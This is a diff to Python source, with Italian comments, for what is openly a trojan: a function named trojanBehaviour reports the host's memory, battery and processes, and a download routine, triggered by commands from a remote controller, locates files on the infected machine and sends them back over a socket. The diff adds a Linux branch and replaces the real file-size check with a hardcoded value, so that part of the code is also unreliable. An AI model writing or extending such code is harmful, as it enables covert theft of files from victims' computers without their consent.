@@ -48,9 +48,16 @@ def trojanBehaviour():
                                                                                                               int(mem),
                                                                                                               int(battery)))
             print("              ------------------------------------------------------------- ")
-            process = subprocess.Popen('tasklist /fi "MEMUSAGE gt 100000"', stdout=subprocess.PIPE,
-                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE,
-                                       shell=True)
+
+            if platform.system() == "Windows":
+                process = subprocess.Popen('tasklist /fi "MEMUSAGE gt 100000"', stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                                           shell=True)
+            else:
+                process = subprocess.Popen('top', stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                                           shell=True)
+
             timer = Timer(3, process.terminate)
             try:
                 timer.start()
@@ -72,6 +79,7 @@ def trojanBehaviour():
 
 
 def download(comando,client):
+    currentPath=os.getcwd()
 
     counter_virgolette=0
     counter_spazi=0
@@ -125,7 +133,9 @@ def download(comando,client):
                 filetrovato=True
                 #esegui procedura di download
                 try:
-                    filesize = os.path.getsize(file)
+                    #filesize = os.path.getsize(file)
+                    filesize=10
+                    os.chdir(path)
                     if filesize<=0:
                         raise Exception
                     else:
@@ -140,7 +150,10 @@ def download(comando,client):
                             time.sleep(2)
                             client.send(("[END]").encode(FORMAT))
                             f.close()
+                            os.chdir(currentPath)
                 except:
+                    traceback.print_exc()
+                    print("error")
                     client.send(("[ERROR]").encode(FORMAT))
 
         if filetrovato == True:
@@ -149,11 +162,6 @@ def download(comando,client):
             print("il file non è stato trovato")
     else:
         print("Al client è arrivata una regex che non fa match")
-
-
-
-
-
 
 
 # OK creazione file con tutti i tipi di tipologia
